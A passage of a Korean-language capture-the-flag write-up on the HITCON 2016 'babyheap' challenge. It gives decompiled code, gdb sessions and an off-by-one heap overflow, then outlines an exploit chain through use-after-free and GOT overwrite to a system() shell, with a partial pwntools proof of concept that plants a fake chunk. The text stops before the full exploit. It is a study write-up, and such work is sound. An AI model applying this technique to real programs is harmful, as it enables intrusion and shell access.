---
title: "Pwn-Babyheap(300) - Solved by 3 Teams"
sidebar_position: 1
---


## **Information**

### **Description**

```Heap so fun! Baby, don't do it first.  
nc 52.68.77.85 8731

note : the service is running on ubuntu 16.04

[babyheap](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **File**
* [babyheap\_bb488b64300c18a3cd7c60ec1deac79cddb1327b](/attachments/7536646/7537131.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536646/7537133.bin)

### **Source Code**

## **Write up**

### File information

```sh title="File Information"
autolycos@ubuntu:~/CTF/HITCON/Babyheap$ file babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b: ELF 64-bit LSB  executable, x86-64, versin 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=2cf55840293ae4d6ddc13488c57b8009e598642f, stripped
autolycos@ubuntu:~/CTF/HITCON/Babyheap$ checksec.sh --file babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b
autolycos@ubuntu:~/CTF/HITCON/Babyheap$
```

### **Binary analysis**

#### **Main()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + PrintMenu() 함수를 이용해 메뉴를 출력합니다.
  + UserInput() 함수를 이용해 사용자로 부터 값을 입력받습니다.

```sh title="Main Function"
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int command; // eax@2
  char v4; // [rsp+10h] [rbp-10h]@12
  __int64 v5; // [rsp+18h] [rbp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  SetSIGALRM();
  while ( 1 )
  {
    while ( 1 )
    {
      PrintMenu();
      command = UserInput();
      if ( command != 2 )
        break;
      Delete();
    }
    if ( command > 2 )
    {
      if ( command == 3 )
      {
        Edit();
      }
      else if ( command == 4 )
      {
        printf("Really? (Y/n)", a2);
        a2 = (char **)&v4;
        __isoc99_scanf((__int64)"%2s", (__int64)&v4);
        if ( v4 != aN[0] )
          _exit(0);
      }
      else
      {
LABEL_14:
        puts("Invalid choice !");
      }
    }
    else
    {
      if ( command != 1 )
        goto LABEL_14;
      New();
    }
  }
}
```

* **다음과 같이 Hex-ray로 복원된 코드가 조금 이상합니다.**
  + - main() 함수의 2번째 인자값을 printf()함수의 2번째 인자로 전달합니다.
    - main() 함수의 2번째 인자값에 &v4 값을 저장합니다.

```sh title="Exit"
else if ( command == 4 )
{
	printf("Really? (Y/n)", a2);
	a2 = (char **)&v4;
	__isoc99_scanf((__int64)"%2s", (__int64)&v4);
	if ( v4 != aN[0] )
		_exit(0);
}
```

* **다음은 해당 코드를 Assembly code로 출력한 내용입니다.**
  + Assembly code 에서는 scanf()함수의 2번째 인자 값으로 main() 함수의 2번째 인자 값이 전달됩니다.
    - "lea rax, [rbp+var\_10]"
    - "mov rsi, rax"

```sh title="Exit Assembly"
.text:0000000000400D1A                 mov     edi, offset aReally?YN ; "Really? (Y/n)"
.text:0000000000400D1F                 mov     eax, 0
.text:0000000000400D24                 call    _printf
.text:0000000000400D29                 lea     rax, [rbp+var_10]
.text:0000000000400D2D                 mov     rsi, rax
.text:0000000000400D30                 mov     edi, offset a2s ; "%2s"
.text:0000000000400D35                 mov     eax, 0
.text:0000000000400D3A                 call    ___isoc99_scanf
.text:0000000000400D3F                 lea     rax, [rbp+var_10]
.text:0000000000400D43                 movzx   edx, byte ptr [rax]
.text:0000000000400D46                 mov     eax, offset aN  ; "n"
.text:0000000000400D4B                 movzx   eax, byte ptr [rax]
.text:0000000000400D4E                 cmp     dl, al
.text:0000000000400D50                 jz      short loc_400D6B
.text:0000000000400D52                 mov     edi, 0          ; status
.text:0000000000400D57                 call    __exit
```

* **즉, 다음과 같은 코드라고 유추 할수 입습니다.**

```sh title="Exit C Code"
else if ( command == 4 )
{
	printf("Really? (Y/n)");
	__isoc99_scanf((__int64)"%2s", (__int64)&a2);
	if ( v4 != aN[0] )
		_exit(0);
}
```

#### **UserInput()**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + read() 함수를 이용해 사용자로 부터 값을 입력받습니다.
  + 입력 받은 값을 atoi() 함수에 전달해 정수를 반환 받습니다.
* **여기에 취약성이 존재합니다.**
  + nptr의 크기는 4byte이지만 read() 함수에서는 16byte를 입력받습니다.

```c title="UserInput()"
__int64 UserInput()
{
  char nptr[4]; // [rsp+10h] [rbp-20h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __read_chk(0LL, nptr, 16LL, 16LL);
  return (unsigned int)atoi(nptr);
}
```

* **다음과 같이 "nptr"변수 뒤에 값을 변경할 수 있습니다.**
  + read() 함수에 입력 받은 값을 저장할 공간은 0x7fffffffe140 입니다.
  + 아래와 같이 15개의 문자를 입력해 0x7fffffffe148 영역을 덮어쓸 수 있습니다.

```sh title="Debugging"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ gdb -q ./baby*
Reading symbols from ./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b...(no debugging symbols found)...done.
gdb-peda$ b *0x400948
Breakpoint 1 at 0x400948
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:
Breakpoint 1, 0x0000000000400948 in ?? ()
gdb-peda$ i r rsi
rsi            0x7fffffffe140	0x7fffffffe140
gdb-peda$ x/4gx 0x7fffffffe140
0x7fffffffe140:	0x0000000000000000	0x00007ffff7ffe168
0x7fffffffe150:	0x0000000000000005	0x1f0d0a69bf7b7b00
gdb-peda$ ni
AAAAAAAABBBBBBB  

0x000000000040094d in ?? ()
gdb-peda$ x/4gx 0x7fffffffe140
0x7fffffffe140:	0x4141414141414141	0x0a42424242424242
0x7fffffffe150:	0x0000000000000005	0x1f0d0a69bf7b7b00
gdb-peda$
```

#### **New()**

* **해당 함수는 다음과 같은 구조체를 사용합니다.**

```c title="Data Structure"
struct DATA
{
  size_t size;
  char name[8];
  char *content;
};
```

* **해당 함수는 다음과 같은 기능을 합니다.**
  + gData 전역 변수에 DATA 구조체의 공간을 할당합니다.
  + 사용자로 부터 "Size"의 값을 입력 받아, 해당 크기 만큼 Heap 공간을 할당합니다.
  + UserInputStr() 함수를 이용해 "gData→content" 영역에 "gData→size"에 저장된 값 만큼 문자를 입력 받습니다.
  + UserInputStr() 함수를 이용해 "gData→name" 영역에 최대 8개의 문자를 입력받습니다.

```c title="New()"
int New()
{
  DATA *size; // rbx
  DATA *content; // rbx

  if ( gData )
  {
    puts("bye bye");
    _exit(0);
  }
  gData = (DATA *)malloc(0x18uLL);
  if ( !gData )
  {
    puts("Error");
    _exit(-1);
  }
  printf("Size :");
  size = gData;
  size->size = (signed int)UserInput();
  content = gData;
  content->content = (char *)malloc(gData->size);
  if ( !gData->content )
  {
    puts("Error");
    _exit(-1);
  }
  printf("Content:");
  UserInputStr(gData->content, (unsigned int)gData->size);
  printf("Name:");
  UserInputStr(gData->name, 8LL);
  return puts("Done!");
}
```

#### **UserInputStr**
* **해당 함수는 다음과 같은 기능을 처리합니다.**
  + 인자값으로 문자열을 저장할 주소, String의 size값을 전달 받습니다.
  + read()함수를 이용하여 content변수에, size크기 만큼 값을 입력받습니다.
  + 입력된 문자열의 맨 마지막에 위치한 값을 0으로 변경합니다.
    - 문자열 입력시 같이 입력되는 Line feed(0xA)를 제거하기 위한것이라고 유추해볼 수 있습니다.

```c title="UserInputStr"
char *__fastcall UserInputStr(char *content, int size)
{
  char *result; // rax
  int len; // [rsp+1Ch] [rbp-4h]

  len = read(0, content, size);
  if ( len <= 0 )
  {
    puts("Error");
    _exit(-1);
  }
  result = &content[len];
  *result = 0;
  return result;
}
```

* **여기에서 Off-by-One Error 취약성이 발생합니다.**
  + read() 함수로 부터 반환되는 값을 read() 함수를 통해 **읽어들인 byte의 수를 반환**합니다.
  + **해당 값을 배열의 위치 값으로 사용**하며, 입력된 문자열의 맨 마지막에 위치한 값을 0으로 변경합니다.
  + 예를 들어 "content"에 할당된 공간의 크기가 8byte 일 경우 사용자가 8byte의 문자열을 입력 할 경우 "content" 영역을 벗어난 영역의 값을 '0'으로 변경하게 됩니다.
  + - 배열의 시작은 '1' 이 아닌 '0' 부터 시작합니다.

**Off-by-One Error**

| content | [0] | [1] | [2] | [3] | [4] | [5] | [6] | [7] | [8] |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| String | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \xd9 |
| result = &content[len]; \*result = 0; | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x41 | \x00 |

#### **Delete**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + gDeleteState 전역변수를 이용하여 해당 기능이 단 한번만 동작하도록 합니다.(기본 값 0)
  + free() 함수를 이용하여 gData→content, gData 영역에 할당된 영역을 해제 합니다.

```c title="Delete()"
__int64 Delete()
{
  if ( !gData || gDeleteState )
  {
    puts("bye bye");
    _exit(0);
  }
  free(gData->content);
  free(gData);
  gData = 0LL;
  return (unsigned int)(gDeleteState++ + 1);
}
```

#### **Edit**

* **해당 함수는 다음과 같은 기능을 합니다.**
  + 전역변수 gEditState를 이용하여 해당 기능이 단 한번만 동작하도록 합니다.(기본 값 0)
  + UserInputString() 함수를 이용하여 "gData→content"에 저장된 내용을 변경합니다.

```c title="Edit()"
int Edit()
{
  if ( !gData || gEditState )
  {
    puts("bye bye");
    _exit(0);
  }
  printf("Content:");
  UserInputStr(gData->content, gData->size);
  ++gEditState;
  return puts("Done!");
}
```

### Debuging

#### **Scanf()**

* **해당 프로그램에서는 "Exit" 기능을 선택했을 때문 scanf()함수를 이용해 값을 입력 받고 있습니다.**
  + scanf()함수를 호출하기 전에는 heap 영역이 없습니다.
  + scanf()함수를 호출 후에는 heap 영역이 생성됩니다.
    - 생성된 Heap영역에는 사용자가 입력한 모든 값이 저장되어 있습니다.

```sh title="scanf() 함수 호출 전, 후 메모리 변화"
lazenca0x0@ubuntu:~/CTF/HITCON/Babyheap$ gdb -q ./baby*
Reading symbols from ./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b...(no debugging symbols found)...done.
gdb-peda$ b *0x400D3A
Breakpoint 1 at 0x400d3a
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:4
Really? (Y/n)
Breakpoint 1, 0x0000000000400d3a in ?? ()
gdb-peda$ p main_arena 
$1 = {
  mutex = 0x0, 
  flags = 0x0, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x0, 
  last_remainder = 0x0, 
  bins = {0x0 <repeats 254 times>}, 
  binmap = {0x0, 0x0, 0x0, 0x0}, 
  next = 0x7ffff7dd1b20 <main_arena>, 
  next_free = 0x0, 
  attached_threads = 0x1, 
  system_mem = 0x0, 
  max_system_mem = 0x0
}
gdb-peda$ ni
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
gdb-peda$ p main_arena 
$2 = {
  mutex = 0x0, 
  flags = 0x1, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x603410, 
  last_remainder = 0x0, 
  bins = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 
    0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 
    0x7ffff7dd1be8 <main_arena+200>, 0x7ffff7dd1be8 <main_arena+200>, 0x7ffff7dd1bf8 <main_arena+216>, 0x7ffff7dd1bf8 <main_arena+216>, 0x7ffff7dd1c08 <main_arena+232>, 
    0x7ffff7dd1c08 <main_arena+232>, 0x7ffff7dd1c18 <main_arena+248>, 0x7ffff7dd1c18 <main_arena+248>, 0x7ffff7dd1c28 <main_arena+264>, 0x7ffff7dd1c28 <main_arena+264>, 
    0x7ffff7dd1c38 <main_arena+280>, 0x7ffff7dd1c38 <main_arena+280>, 0x7ffff7dd1c48 <main_arena+296>, 0x7ffff7dd1c48 <main_arena+296>, 0x7ffff7dd1c58 <main_arena+312>, 
    0x7ffff7dd1c58 <main_arena+312>, 0x7ffff7dd1c68 <main_arena+328>, 0x7ffff7dd1c68 <main_arena+328>, 0x7ffff7dd1c78 <main_arena+344>, 0x7ffff7dd1c78 <main_arena+344>, 
    0x7ffff7dd1c88 <main_arena+360>, 0x7ffff7dd1c88 <main_arena+360>, 0x7ffff7dd1c98 <main_arena+376>, 0x7ffff7dd1c98 <main_arena+376>, 0x7ffff7dd1ca8 <main_arena+392>, 
    0x7ffff7dd1ca8 <main_arena+392>, 0x7ffff7dd1cb8 <main_arena+408>, 0x7ffff7dd1cb8 <main_arena+408>, 0x7ffff7dd1cc8 <main_arena+424>, 0x7ffff7dd1cc8 <main_arena+424>, 
    0x7ffff7dd1cd8 <main_arena+440>, 0x7ffff7dd1cd8 <main_arena+440>, 0x7ffff7dd1ce8 <main_arena+456>, 0x7ffff7dd1ce8 <main_arena+456>, 0x7ffff7dd1cf8 <main_arena+472>, 
    0x7ffff7dd1cf8 <main_arena+472>, 0x7ffff7dd1d08 <main_arena+488>, 0x7ffff7dd1d08 <main_arena+488>, 0x7ffff7dd1d18 <main_arena+504>, 0x7ffff7dd1d18 <main_arena+504>, 
    0x7ffff7dd1d28 <main_arena+520>, 0x7ffff7dd1d28 <main_arena+520>, 0x7ffff7dd1d38 <main_arena+536>, 0x7ffff7dd1d38 <main_arena+536>, 0x7ffff7dd1d48 <main_arena+552>, 
    0x7ffff7dd1d48 <main_arena+552>, 0x7ffff7dd1d58 <main_arena+568>, 0x7ffff7dd1d58 <main_arena+568>, 0x7ffff7dd1d68 <main_arena+584>, 0x7ffff7dd1d68 <main_arena+584>, 
    0x7ffff7dd1d78 <main_arena+600>, 0x7ffff7dd1d78 <main_arena+600>, 0x7ffff7dd1d88 <main_arena+616>, 0x7ffff7dd1d88 <main_arena+616>, 0x7ffff7dd1d98 <main_arena+632>, 
    0x7ffff7dd1d98 <main_arena+632>, 0x7ffff7dd1da8 <main_arena+648>, 0x7ffff7dd1da8 <main_arena+648>, 0x7ffff7dd1db8 <main_arena+664>, 0x7ffff7dd1db8 <main_arena+664>, 
    0x7ffff7dd1dc8 <main_arena+680>, 0x7ffff7dd1dc8 <main_arena+680>, 0x7ffff7dd1dd8 <main_arena+696>, 0x7ffff7dd1dd8 <main_arena+696>, 0x7ffff7dd1de8 <main_arena+712>, 
    0x7ffff7dd1de8 <main_arena+712>, 0x7ffff7dd1df8 <main_arena+728>, 0x7ffff7dd1df8 <main_arena+728>, 0x7ffff7dd1e08 <main_arena+744>, 0x7ffff7dd1e08 <main_arena+744>, 
    0x7ffff7dd1e18 <main_arena+760>, 0x7ffff7dd1e18 <main_arena+760>, 0x7ffff7dd1e28 <main_arena+776>, 0x7ffff7dd1e28 <main_arena+776>, 0x7ffff7dd1e38 <main_arena+792>, 
    0x7ffff7dd1e38 <main_arena+792>, 0x7ffff7dd1e48 <main_arena+808>, 0x7ffff7dd1e48 <main_arena+808>, 0x7ffff7dd1e58 <main_arena+824>, 0x7ffff7dd1e58 <main_arena+824>, 
    0x7ffff7dd1e68 <main_arena+840>, 0x7ffff7dd1e68 <main_arena+840>, 0x7ffff7dd1e78 <main_arena+856>, 0x7ffff7dd1e78 <main_arena+856>, 0x7ffff7dd1e88 <main_arena+872>, 
    0x7ffff7dd1e88 <main_arena+872>, 0x7ffff7dd1e98 <main_arena+888>, 0x7ffff7dd1e98 <main_arena+888>, 0x7ffff7dd1ea8 <main_arena+904>, 0x7ffff7dd1ea8 <main_arena+904>, 
    0x7ffff7dd1eb8 <main_arena+920>, 0x7ffff7dd1eb8 <main_arena+920>, 0x7ffff7dd1ec8 <main_arena+936>, 0x7ffff7dd1ec8 <main_arena+936>, 0x7ffff7dd1ed8 <main_arena+952>, 
    0x7ffff7dd1ed8 <main_arena+952>, 0x7ffff7dd1ee8 <main_arena+968>, 0x7ffff7dd1ee8 <main_arena+968>, 0x7ffff7dd1ef8 <main_arena+984>, 0x7ffff7dd1ef8 <main_arena+984>, 
    0x7ffff7dd1f08 <main_arena+1000>, 0x7ffff7dd1f08 <main_arena+1000>, 0x7ffff7dd1f18 <main_arena+1016>, 0x7ffff7dd1f18 <main_arena+1016>, 
    0x7ffff7dd1f28 <main_arena+1032>, 0x7ffff7dd1f28 <main_arena+1032>, 0x7ffff7dd1f38 <main_arena+1048>, 0x7ffff7dd1f38 <main_arena+1048>, 
    0x7ffff7dd1f48 <main_arena+1064>, 0x7ffff7dd1f48 <main_arena+1064>, 0x7ffff7dd1f58 <main_arena+1080>, 0x7ffff7dd1f58 <main_arena+1080>, 
    0x7ffff7dd1f68 <main_arena+1096>, 0x7ffff7dd1f68 <main_arena+1096>, 0x7ffff7dd1f78 <main_arena+1112>, 0x7ffff7dd1f78 <main_arena+1112>, 
    0x7ffff7dd1f88 <main_arena+1128>, 0x7ffff7dd1f88 <main_arena+1128>, 0x7ffff7dd1f98 <main_arena+1144>, 0x7ffff7dd1f98 <main_arena+1144>, 
    0x7ffff7dd1fa8 <main_arena+1160>, 0x7ffff7dd1fa8 <main_arena+1160>, 0x7ffff7dd1fb8 <main_arena+1176>, 0x7ffff7dd1fb8 <main_arena+1176>, 
    0x7ffff7dd1fc8 <main_arena+1192>, 0x7ffff7dd1fc8 <main_arena+1192>, 0x7ffff7dd1fd8 <main_arena+1208>, 0x7ffff7dd1fd8 <main_arena+1208>, 
    0x7ffff7dd1fe8 <main_arena+1224>, 0x7ffff7dd1fe8 <main_arena+1224>, 0x7ffff7dd1ff8 <main_arena+1240>, 0x7ffff7dd1ff8 <main_arena+1240>, 
    0x7ffff7dd2008 <main_arena+1256>, 0x7ffff7dd2008 <main_arena+1256>, 0x7ffff7dd2018 <main_arena+1272>, 0x7ffff7dd2018 <main_arena+1272>, 
    0x7ffff7dd2028 <main_arena+1288>, 0x7ffff7dd2028 <main_arena+1288>, 0x7ffff7dd2038 <main_arena+1304>, 0x7ffff7dd2038 <main_arena+1304>, 
    0x7ffff7dd2048 <main_arena+1320>, 0x7ffff7dd2048 <main_arena+1320>, 0x7ffff7dd2058 <main_arena+1336>, 0x7ffff7dd2058 <main_arena+1336>, 
    0x7ffff7dd2068 <main_arena+1352>, 0x7ffff7dd2068 <main_arena+1352>, 0x7ffff7dd2078 <main_arena+1368>, 0x7ffff7dd2078 <main_arena+1368>, 
    0x7ffff7dd2088 <main_arena+1384>, 0x7ffff7dd2088 <main_arena+1384>, 0x7ffff7dd2098 <main_arena+1400>, 0x7ffff7dd2098 <main_arena+1400>, 
    0x7ffff7dd20a8 <main_arena+1416>, 0x7ffff7dd20a8 <main_arena+1416>, 0x7ffff7dd20b8 <main_arena+1432>, 0x7ffff7dd20b8 <main_arena+1432>, 
    0x7ffff7dd20c8 <main_arena+1448>, 0x7ffff7dd20c8 <main_arena+1448>, 0x7ffff7dd20d8 <main_arena+1464>, 0x7ffff7dd20d8 <main_arena+1464>, 
    0x7ffff7dd20e8 <main_arena+1480>, 0x7ffff7dd20e8 <main_arena+1480>, 0x7ffff7dd20f8 <main_arena+1496>, 0x7ffff7dd20f8 <main_arena+1496>, 
    0x7ffff7dd2108 <main_arena+1512>, 0x7ffff7dd2108 <main_arena+1512>, 0x7ffff7dd2118 <main_arena+1528>, 0x7ffff7dd2118 <main_arena+1528>, 
    0x7ffff7dd2128 <main_arena+1544>, 0x7ffff7dd2128 <main_arena+1544>, 0x7ffff7dd2138 <main_arena+1560>, 0x7ffff7dd2138 <main_arena+1560>, 
    0x7ffff7dd2148 <main_arena+1576>, 0x7ffff7dd2148 <main_arena+1576>, 0x7ffff7dd2158 <main_arena+1592>, 0x7ffff7dd2158 <main_arena+1592>, 
    0x7ffff7dd2168 <main_arena+1608>, 0x7ffff7dd2168 <main_arena+1608>, 0x7ffff7dd2178 <main_arena+1624>, 0x7ffff7dd2178 <main_arena+1624>, 
    0x7ffff7dd2188 <main_arena+1640>, 0x7ffff7dd2188 <main_arena+1640>, 0x7ffff7dd2198 <main_arena+1656>, 0x7ffff7dd2198 <main_arena+1656>, 
    0x7ffff7dd21a8 <main_arena+1672>, 0x7ffff7dd21a8 <main_arena+1672>...}, 
  binmap = {0x0, 0x0, 0x0, 0x0}, 
  next = 0x7ffff7dd1b20 <main_arena>, 
  next_free = 0x0, 
  attached_threads = 0x1, 
  system_mem = 0x21000, 
  max_system_mem = 0x21000
}
gdb-peda$ x/10gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411
0x603010:	0x4141414141414141	0x4141414141414141
0x603020:	0x4141414141414141	0x4141414141414141
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x4141414141414141
gdb-peda$
```

* **생성된 heap 영역에 저장된 값은 scanf() 함수를 통해 입력 받은 값이 저장되어 있습니다.**
  + scanf() 함수를 위해 할당된 메모리의 크기는 1024(0x400) byte 입니다.
  + 디버깅 모드가 아닐 경우 할당되는 메모리의 크기는 4096(0x1000) byte 입니다.

```sh title="heap 영역에 저장된 값"
(gdb) x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000411
0x603010:	0x414141414141416e	0x4141414141414141
0x603020:	0x4141414141414141	0x4141414141414141
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x4141414141414141
0x603050:	0x000000000a414141	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
(gdb)
```

#### **Overflow(Off-by-One Error)**

* **다음과 같이 Break point를 설정합니다.**

```sh title="Set Breakpoint"
gdb-peda$ b *0x4009B8
Breakpoint 1 at 0x4009b8
gdb-peda$ b *0x4009C5 
Breakpoint 2 at 0x4009c5
gdb-peda$
```

* **다음과 같이 top chunk의 값을 1byte 덮어쓸 수 있습니다.**
  + "Content"의 크기를 24로 설정하면, 할당받은 메모리 영역 뒤 8byte는 "Top chunk" 영역을 사용됩니다.
  + "Content"의 입력 값으로 문자 24개를 입력하게 되면 "Top chunk"의 1byte가 "0x00"으로 변경됩니다.

```sh title="Off-by-One Error(Top chunk)"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/Babyheap/babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b 
#########################
        Baby Heap        
#########################
 1 . New                 
 2 . Delete              
 3 . Edit                
 4 . Exit                
#########################
Your choice:1 
Size :24
Content:

Breakpoint 1, 0x0000000000400996 in ?? ()
gdb-peda$ i r rsi
rsi            0x603030	0x603030
gdb-peda$ c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x00000000004009b8 in ?? ()
gdb-peda$ 
Continuing.
Breakpoint 3, 0x00000000004009c5 in ?? ()
gdb-peda$ i r rax
rax            0x603048	0x603048
gdb-peda$ x/4gx 0x603030
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x0000000000020fc1
gdb-peda$ x/bx 0x603048
0x603048:	0xc1
gdb-peda$ ni

0x00000000004009c8 in ?? ()
gdb-peda$ x/bx 0x603048
0x603048:	0x00
gdb-peda$ x/4gx 0x603030
0x603030:	0x4141414141414141	0x4141414141414141
0x603040:	0x4141414141414141	0x0000000000020f00
gdb-peda$
```

* **다음과 같이 "\*content"의 값을 1byte 덮어쓸 수 있습니다.**
  + "gData→name" 변수 영역 뒤에 "gData→content"가 위치 합니다.
    - "gData→content" 영역에는 할당 받은 Heap 영역의 주소가 저장되어 있습니다.
  + "Name"의 값으로 문자 8개를 입력해 "gData→content" 영역의 1byte를 "0x00"으로 변경됩니다.
    - 0x603030 → 0x603000

```sh title="Off-by-One Error(content)"
gdb-peda$ c
Continuing.
Name:
Breakpoint 1, 0x0000000000400996 in ?? ()
gdb-peda$ i r rsi
rsi            0x603018	0x603018
gdb-peda$ x/4gx 0x603018
0x603018:	0x0000000000000000	0x0000000000603030
0x603028:	0x0000000000000021	0x4141414141414141
gdb-peda$ c
Continuing.
AAAAAAAA

Breakpoint 2, 0x00000000004009b8 in ?? ()
gdb-peda$ 
Continuing.

Breakpoint 3, 0x00000000004009c5 in ?? ()
gdb-peda$ i r rax
rax            0x603020	0x603020
gdb-peda$ x/bx 0x603020
0x603020:	0x30
gdb-peda$ x/4gx 0x603018
0x603018:	0x4141414141414141	0x0000000000603030
0x603028:	0x0000000000000021	0x4141414141414141
gdb-peda$ ni
0x00000000004009c8 in ?? ()
gdb-peda$ x/4gx 0x603018
0x603018:	0x4141414141414141	0x0000000000603000
0x603028:	0x0000000000000021	0x4141414141414141
gdb-peda$
```

### Structure of Exploit code

* **Payload의 순서는 다음과 같습니다.**

:::note[Payload 순서]
1. Write Fake chunk
2. Off-by-One Error에 의한 Heap Overflow
3. 메모리 해제
4. UAF에 의한 Heap Overflow
5. FSB 취약점 생성
6. Leak libc addresss
7. system() 함수를 이용한 shell 획득
:::

* **이를 조금더 자세하게 설명하면 다음과 같습니다.**

:::note[상세 설명]
1. Write Fake chunk
   1. "4. Exit" 기능을 이용해 Heap영역에 Fake chunk 저장
2. Off-by-One Error에 의한 Heap Overflow
   1. "1. New" 기능을 이용해 "ptr->Content" 값 변경
3. 메모리 해제
   1. "2. Delete" 기능을 이용해 메모리 해제
4. UAF를 이용한 Heap Overflow
   1. 첫번째 malloc()함수로 0x18 크기의 Heap memory 생성
   2. 두번째 malloc()함수로 Fake chunk에 저장된 Heap size를 전달해서 Heap memory 생성
   3. Content 내용 입력을 통해 "ptr->Content" 값을 atoi()함수의 GOT값으로 변경
5. FSB 취약점 생성
   1. "3.edit" 기능을 이용하여 GOT overflow
   2. atoi() 함수의 GOT 영역에 printf() 함수의 PLT 주소 값 저장
6. Leak Libc addresss
   1. FSB취약성을 이용한 Libc addresss 추출
7. system() 함수를 이용한 shell 획득
   1. FSB취약성을 이용하여 "gEditState" 전역 변수 값을 0으로 변경
   2. "3.edit" 기능을 이용하여 GOT overflow  
      1. atoi() GOT → Libc system()
:::

* payload를 바탕으로 공격을 위해 알아내어야 할 정보는 다음과 같습니다.

:::note[확인해야 할 정보]
* Off-by-One Error를 이용한 UAF 취약성 생성
  + Fake chunk 구조
* FSB 취약성
  + Leak libc addresss
:::

### Information for attack

#### **UAF vulnerability creation using off-by-one error(Fake chunk)**

* **scanf() 함수와 "Off-by-One Error" 취약성을 이용해 UAF 취약성을 생성 할 수 있습니다.**
* **scanf() 함수를 이용해 Fake allocated chunk를 Heap 영역에 저장합니다.**
  + 우선 공격 대상 프로그램이 디버깅 모드에서 동작하는 것이 아니기 때문에 scanf() 함수에서 할당되는 Heap의 크기는 4096(0x1000)이 됩니다.
  + 정확한 Exploit code를 작성하기 위해 다음과 같은 코드가 필요합니다.
* **scanf() 함수에 전달된 입력 값은 다음과 같습니다.**
  + 'n' + 'A' \* 4064 + prev\_size(0x00000000) + size(0x00000071)

```python title="poc.py"
from pwn import *

def NewFunction(size,content,name):
        p.recvuntil('Your choice:')
        p.sendline('1')
        p.recvuntil('Size :')
        p.sendline(str(size))
        p.recvuntil('Content:')
        p.sendline(content)
        p.recvuntil('Name:')
        p.sendline(name)

def DeleteFunction():
        p.recvuntil('Your choice:')
        p.sendline('2')

def EditFunction(content):
        p.recvuntil('Your choice:')
        p.sendline('3')
        p.recvuntil('Content:')
        p.sendline(content)

def ExitFunction(answer):
        p.recvuntil('Your choice:')
        p.sendline('4')
        p.recvuntil('Really? (Y/n)')
        p.sendline(answer)

p = process('./babyheap_bb488b64300c18a3cd7c60ec1deac79cddb1327b')
sleep(30)
fakechunk = "n".ljust(0xfe0,"\x41") + p64(0) + p64(0x71)
print "Fake chunk : " + fakechunk

ExitFunction(fakechunk)
p.interactive()
```

* **다음과 같이 Heap 영역에 Fake allocated chunk가 저장됩니다.**
  + scanf() 함수에 의해 Heap 영역이 할당됩니다.
    - 할당된 Heap 영역 : 0x20e7010
    - 할당된 Heap 영역의 크기 : 0x1000
    - Top chunk 영역 : 0x20e8018
